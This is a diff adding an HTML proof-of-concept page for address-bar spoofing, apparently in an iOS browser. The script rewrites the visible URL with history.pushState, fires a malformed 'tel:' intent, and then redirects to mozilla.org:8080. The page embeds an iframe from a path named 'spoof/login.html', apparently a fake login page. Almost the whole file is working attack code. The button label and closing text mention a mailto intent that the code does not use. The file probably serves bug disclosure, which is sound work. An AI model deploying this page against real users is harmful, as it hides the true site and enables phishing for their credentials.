@@ -1,0 +1,49 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>iOS External Intent Navigation State PoC</title>
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+    }
+    iframe {
+      width: 100%;
+      height: 420px;
+      border: 1px solid #ccc;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+<button id="test">Trigger mailto intent</button>
+
+<!-- iframe langsung ada -->
+<iframe src="https://cnfdnfial-ops.github.io/spoof/login.html"></iframe>
+
+<script>
+document.getElementById('test').onclick = () => {
+
+  // Step 1: change visible URL
+  history.pushState({}, '', '/expected-path');
+
+  // Step 2: trigger external intent
+  setTimeout(() => {
+    location.href = 'tel:+mozola:says tap again';
+  }, 300);
+
+  // Step 3: delayed navigation after intent
+  setTimeout(() => {
+    location.href = 'https://www.mozilla.org:8080';
+  }, 1200);
+};
+</script>
+
+<p>
+Observe whether the address bar always reflects the active document
+after returning from the mail app.
+</p>
+
+</body>
+</html>
